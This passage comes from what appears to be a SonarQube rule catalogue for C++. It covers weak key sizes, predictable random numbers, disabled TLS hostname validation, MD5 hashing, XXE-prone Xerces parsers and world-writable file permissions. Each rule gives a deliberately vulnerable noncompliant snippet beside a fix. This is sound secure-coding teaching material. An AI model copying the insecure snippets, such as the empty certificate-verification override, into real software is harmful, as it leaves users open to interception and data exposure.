<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant
}
</pre>
<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group(&#34;dsa/botan/1024&#34;); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group(&#34;secp160k1&#34;); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group(&#34;dsa/botan/2048&#34;);
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group(&#34;secp224k1&#34;);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2245">
              cpp:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive
data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from
  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;random&gt;
// ...

void f() {
  int random_int &#61; std::rand(); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;sodium.h&gt;
#include &lt;botan/system_rng.h&gt;
// ...

void f() {
  char random_chars[10];
  randombytes_buf(random_chars, 10); // Compliant
  uint32_t random_int &#61; randombytes_uniform(10); // Compliant

  uint8_t random_chars[10];
  Botan::System_RNG system;
  system.randomize(random_chars, 10); // Compliant
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/oTdGBQ" rel="nofollow">CERT, MSC02-J.</a> - Generate strong random numbers </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ" rel="nofollow">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ" rel="nofollow">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5527">
              cpp:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4790">
              cpp:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(&#34;MD5&#34;)); // Sensitive
    return hash-&gt;process(input);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(&#34;SHA-512&#34;)); // Compliant
    return hash-&gt;process(input);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2755">
              cpp:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Xerces</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include &#34;xercesc/parsers/XercesDOMParser.hpp&#34;

void parse() {
  XercesDOMParser *DOMparser &#61; new XercesDOMParser();
  DOMparser-&gt;setCreateEntityReferenceNodes(false); // Noncompliant
  DOMparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>XMLReaderFactory::createXMLReader</code>.</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
#include &#34;xercesc/sax2/SAX2XMLReader.hpp&#34;

void parse() {
  SAX2XMLReader* reader &#61; XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, false); // Noncompliant

  reader-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>SAXParser</code>.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
#include &#34;xercesc/parsers/SAXParser.hpp&#34;

void parse() {
  SAXParser* SAXparser &#61; new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h4>Compliant solution</h4>
<p>By default, <code>XercesDOMParser</code> is safe.</p>
<pre data-diff-id="11" data-diff-type="compliant">
#include &#34;xercesc/parsers/XercesDOMParser.hpp&#34;

void parse() {
  XercesDOMParser *DOMparser &#61; new XercesDOMParser();
  DOMparser-&gt;setCreateEntityReferenceNodes(true);
  DOMparser-&gt;setDisableDefaultEntityResolution(true);

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
#include &#34;xercesc/sax2/SAX2XMLReader.hpp&#34;

void parse() {
  SAX2XMLReader* reader &#61; XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);

  reader-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
#include &#34;xercesc/parsers/SAXParser.hpp&#34;

void parse() {
  SAXParser* SAXparser &#61; new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(true);

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2612">
              cpp:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>When creating a file or directory with permissions to &#34;other group&#34;:</p>
<pre>
open(&#34;myfile.txt&#34;, O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file

mkdir(&#34;myfolder&#34;, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory
</pre>
<p>When explicitly adding permissions to &#34;other group&#34; with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>
functions:</p>
<pre>
chmod(&#34;myfile.txt&#34;, S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file

fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor
</pre>
<p>When defining the <code>umask</code> without read, write and execute permissions for &#34;other group&#34;:</p>
<pre>
umask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to &#34;other group&#34;
</pre>
<h2>Compliant Solution</h2>
<p>When creating a file or directory, do not set permissions to &#34;other group&#34;:</p>
<pre>
open(&#34;myfile.txt&#34;, O_CREAT, S_IRWXU | S_IRWXG); // Compliant

mkdir(&#34;myfolder&#34;, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to &#34;other group&#34;:</p>
<pre>
chmod(&#34;myfile.txt&#34;, S_IRWXU | S_IRWXG);  // Compliant

fchmod(fd, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>
<pre>
umask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for &#34;other group&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO01-J.</a> -
  Create files with appropriate access permissions </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO06-C.</a> - Create
